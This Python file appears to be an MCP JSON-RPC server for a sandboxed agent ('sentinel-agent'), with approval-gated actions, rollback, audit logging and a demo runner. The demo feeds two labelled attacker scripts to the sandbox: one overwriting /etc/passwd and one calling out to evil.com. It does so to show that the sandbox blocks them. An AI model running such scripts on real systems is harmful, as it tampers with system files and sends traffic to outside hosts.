"""MCP JSON-RPC 2.0 TCP server + demo runner + main entry.

Transport: newline-delimited JSON-RPC over TCP.
Batch requests supported. Graceful shutdown on SIGTERM/SIGINT.

Methods:
  initialize         — protocol handshake
  tools/list         — enumerate 4 MCP tools
  tools/call         — dispatch to actions / propose / rollback / audit
  health             — engine stats + sandbox writability
  shutdown           — clean exit (for tests)
"""
from __future__ import annotations

import asyncio
import json
import signal
import sys
from typing import Any, Awaitable, Callable

from .actions import dispatch, list_actions
from .atlassian import approve, list_pending, propose, reject
from .engine import Engine, audit, tail

VERSION = "1.0.1"
Handler = Callable[[dict, Engine], Awaitable[dict]]


def _err(rid: Any, code: int, message: str, data: Any = None) -> dict:
    e: dict[str, Any] = {"code": code, "message": message}
    if data is not None:
        e["data"] = data
    return {"jsonrpc": "2.0", "id": rid, "error": e}


def _ok(rid: Any, result: Any) -> dict:
    return {"jsonrpc": "2.0", "id": rid, "result": result}


# ── MCP method handlers ────────────────────────────────────────────────────
async def _initialize(params: dict, _engine: Engine) -> dict:
    return {"protocolVersion": "2024-11-05",
            "capabilities": {"tools": {}},
            "serverInfo": {"name": "sentinel-agent", "version": VERSION}}


async def _tools_list(params: dict, _engine: Engine) -> dict:
    return {"tools": [
        {"name": "apply_system_change",
         "description": ("Execute a frozen action template inside the Vultr "
                         "sandbox (fs=/scratch, net=Atlassian+Vultr, 30s wall, "
                         "256MB heap). Destructive actions require approval_token."),
         "inputSchema": {"type": "object",
                         "required": ["action", "params"],
                         "properties": {
                             "action": {"type": "string",
                                        "enum": [a["name"] for a in list_actions()]},
                             "params": {"type": "object"},
                             "dryRun": {"type": "boolean", "default": True},
                             "approval_token": {"type": "string"}}}},
        {"name": "propose_actions",
         "description": "Poll Confluence via Atlassian MCP and propose actions.",
         "inputSchema": {"type": "object",
                         "properties": {"max_pages": {"type": "number", "default": 5}}}},
        {"name": "rollback_last",
         "description": "Rollback all WAL-tracked mutations.",
         "inputSchema": {"type": "object", "properties": {}}},
        {"name": "audit_tail",
         "description": "Return last N append-only audit entries.",
         "inputSchema": {"type": "object",
                         "properties": {"n": {"type": "number", "default": 20}}}},
        {"name": "wal_stats",
         "description": "Return WAL backend, pending snapshots, and file size.",
         "inputSchema": {"type": "object", "properties": {}}},
    ]}


async def _tools_call(params: dict, engine: Engine) -> dict:
    name = params.get("name", "")
    args = params.get("arguments", {}) or {}
    if name == "apply_system_change":
        result = await dispatch(engine, args)
    elif name == "propose_actions":
        result = await propose(engine, args)
    elif name == "rollback_last":
        result = await engine.rollback()
    elif name == "audit_tail":
        result = await tail(args.get("n", 20))
    elif name == "wal_stats":
        result = await engine.wal.stats()
    else:
        raise LookupError(f"unknown_tool:{name}")
    return {"content": [{"type": "text",
                         "text": json.dumps(result, default=str)}]}


async def _health(params: dict, engine: Engine) -> dict:
    return await engine.health()


_HANDLERS: dict[str, Handler] = {
    "initialize": _initialize,
    "tools/list": _tools_list,
    "tools/call": _tools_call,
    "health": _health,
}


# ── JSON-RPC dispatch ─────────────────────────────────────────────────────
async def handle_line(line: str, engine: Engine) -> dict | None:
    """Handle one line; may be a single request, batch, or notification."""
    if not line.strip():
        return None
    try:
        req = json.loads(line)
    except json.JSONDecodeError as e:
        return _err(None, -32700, f"parse_error:{e.msg}")

    # Batch
    if isinstance(req, list):
        if not req:
            return _err(None, -32600, "empty_batch")
        results = [await _handle_one(r, engine) for r in req]
        return [r for r in results if r is not None]

    return await _handle_one(req, engine)


async def _handle_one(req: Any, engine: Engine) -> dict | None:
    if not isinstance(req, dict):
        return _err(None, -32600, "invalid_request")
    if req.get("jsonrpc") != "2.0" or "method" not in req:
        return _err(req.get("id"), -32600, "invalid_request")

    method = req["method"]
    handler = _HANDLERS.get(method)
    if handler is None:
        return _err(req.get("id"), -32601, f"method_not_found:{method}")

    try:
        result = await handler(req.get("params") or {}, engine)
    except LookupError as e:
        return _err(req.get("id"), -32601, str(e))
    except Exception as e:
        return _err(req.get("id"), -32603, str(e),
                    data=getattr(e, "code", None))

    if "id" not in req or req["id"] is None:
        return None
    return _ok(req["id"], result)


# ── Server ────────────────────────────────────────────────────────────────
class _Server:
    def __init__(self) -> None:
        self.engine = Engine()
        self._shutdown = asyncio.Event()

    def install_signals(self) -> None:
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGTERM, signal.SIGINT):
            try:
                loop.add_signal_handler(sig, self._shutdown.set)
            except (NotImplementedError, RuntimeError):
                pass

    async def serve(self, stdin=None, stdout=None) -> None:
        stdin = stdin or sys.stdin
        stdout = stdout or sys.stdout
        self.install_signals()
        await audit({"kind": "boot", "version": VERSION,
                     "methods": list(_HANDLERS)})
        loop = asyncio.get_running_loop()
        while not self._shutdown.is_set():
            line = await loop.run_in_executor(None, stdin.readline)
            if not line:
                break
            try:
                resp = await handle_line(line, self.engine)
            except Exception as e:
                resp = _err(None, -32603, str(e))
            if resp is not None:
                stdout.write(json.dumps(resp, default=str) + "\n")
                stdout.flush()
        await audit({"kind": "shutdown", "stats": self.engine.stats()})


async def serve(stdin=None, stdout=None) -> None:
    await _Server().serve(stdin=stdin, stdout=stdout)


# ── Demo runner ───────────────────────────────────────────────────────────
async def _demo() -> None:
    import os
    os.environ.setdefault("SENTINEL_DEMO", "1")
    engine = Engine()
    line = "─" * 64
    print(f"\n{line}\nSENTINEL AGENT — Vultr + Codegeist demo\n{line}")

    print("\n▸ VULTR: attacker tries /etc/passwd via run_script")
    evil_fs = "open('/etc/passwd','w').write('owned')"
    r1 = await dispatch(engine, {"action": "sandbox.run_script",
                                 "params": {"script": evil_fs},
                                 "dryRun": False})
    print("  →", json.dumps(r1.get("error")))

    print("\n▸ VULTR: attacker tries egress to evil.com")
    evil_net = "import urllib.request; urllib.request.urlopen('https://evil.com')"
    r2 = await dispatch(engine, {"action": "sandbox.run_script",
                                 "params": {"script": evil_net},
                                 "dryRun": False})
    print("  →", r2.get("error", {}).get("code"))

    print("\n▸ VULTR: benign script runs; minifier strips noise")
    benign = ("print('hello from sandbox')\n"
              "for i in range(200): print(f'noise-{i}')\n"
              "raise RuntimeError('simulated failure at line 3')")
    r3 = await dispatch(engine, {"action": "sandbox.run_script",
                                 "params": {"script": benign},
                                 "dryRun": False})
    out = ((r3.get("result") or {}).get("output")
           or (r3.get("error") or {}).get("output") or {})
    print("  → exit:", (r3.get("result") or {}).get("receipt", {}).get("exit_code"),
          "| dropped bytes:", out.get("dropped_bytes", 0))

    print("\n▸ CODEGEIST: proposing from Confluence")
    prop = await propose(engine, {"max_pages": 3})
    for i, p in enumerate(prop["proposals"], 1):
        print(f"  [{i}] {p['action']} — {p['reason']}")

    print("\n▸ CODEGEIST: approving only proposal #1")
    pick = prop["proposals"][0]
    r4 = await dispatch(engine, {"action": pick["action"],
                                 "params": pick["params"],
                                 "dryRun": False,
                                 "approval_token": "human-demo"})
    print("  → receipt:",
          json.dumps(r4.get("result", {}).get("receipt") or r4.get("error")))

    print("\n▸ CODEGEIST: rollback")
    print("  →", json.dumps(await engine.rollback()))

    print("\n▸ audit tail (last 5):")
    for e in await tail(5):
        print(" ", (e.get("phase") or e.get("kind", "")).ljust(22),
              (e.get("action") or "").ljust(28), e.get("error", ""))

    print("\n▸ engine stats:", json.dumps(engine.stats()))
    print(f"\n▸ registered templates: {len(list_actions())}")
    print(f"{line}\n")


async def handle_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter, engine: Engine) -> None:
    """Handle TCP client connection for MCP JSON-RPC 2.0"""
    while True:
        try:
            data = await reader.readline()
            if not data:
                break
            line = data.decode()
            resp = await handle_line(line, engine)
            if resp is not None:
                writer.write((json.dumps(resp, default=str) + "\n").encode())
                await writer.drain()
        except Exception as e:
            err_resp = _err(None, -32603, str(e))
            writer.write((json.dumps(err_resp, default=str) + "\n").encode())
            await writer.drain()
            break
    writer.close()
    await writer.wait_closed()

async def _serve_tcp(host: str = "0.0.0.0", port: int = 8081) -> None:
    engine = Engine()
    stop = asyncio.Event()
    loop = asyncio.get_running_loop()
    for sig in (signal.SIGTERM, signal.SIGINT):
        try:
            loop.add_signal_handler(sig, stop.set)
        except (NotImplementedError, RuntimeError):
            pass

    await audit({"kind": "boot", "version": VERSION,
                 "transport": f"tcp://{host}:{port}",
                 "methods": list(_HANDLERS)})

    async def _on_client(r: asyncio.StreamReader,
                         w: asyncio.StreamWriter) -> None:
        await handle_client(r, w, engine)

    server = await asyncio.start_server(_on_client, host, port)
    async with server:
        try:
            await stop.wait()
        finally:
            server.close()
            await server.wait_closed()

    await audit({"kind": "shutdown", "stats": engine.stats()})


def main() -> None:
    if "--demo" in sys.argv:
        asyncio.run(_demo())
        return
    if "--tcp" in sys.argv:
        asyncio.run(_serve_tcp())
        return
    try:
        asyncio.run(serve())
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()